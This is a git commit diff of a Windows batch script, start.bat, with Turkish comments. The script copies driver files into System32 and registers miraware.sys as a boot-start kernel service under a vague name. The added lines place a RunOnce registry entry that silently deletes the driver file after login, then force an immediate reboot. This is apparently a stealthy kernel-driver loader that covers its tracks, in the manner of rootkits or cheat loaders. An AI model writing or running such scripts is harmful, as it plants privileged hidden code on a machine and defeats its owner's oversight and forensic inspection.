6959364e1fe2d2f90b118ab36a591b3756f27041
Xdaxad <ahmofsejaf@gmail.com>
2026-05-23 21:46:40 +0300

    Update start.bat

--- start.bat
+++ start.bat
@@ -23,6 +23,12 @@ if exist "%SCRIPT_DIR%winstorq.sys" (
     copy /y "%SCRIPT_DIR%winstorq.sys" "%system32Dir%\"
 )
 
+:: Sürücüyü oluştur (Boot aşamasında yüklenecek)
 sc create system2 binPath= "C:\Windows\System32\miraware.sys" DisplayName= "ca2" start= boot tag= 2 type= kernel group= "System Reserved" >nul 2>&1
 
+:: RESTART SONRASI SİLME İŞLEMİ (RunOnce Kaydı)
+:: Sistem yeniden açılıp oturum açıldığında miraware.sys dosyasını System32'den sessizce siler.
+reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v "DeleteMirawareSys" /t REG_SZ /d "cmd.exe /c del /f /q C:\Windows\System32\miraware.sys" /f >nul 2>&1
+
+:: Sistemi yeniden başlat
 shutdown /r /t 3 /f
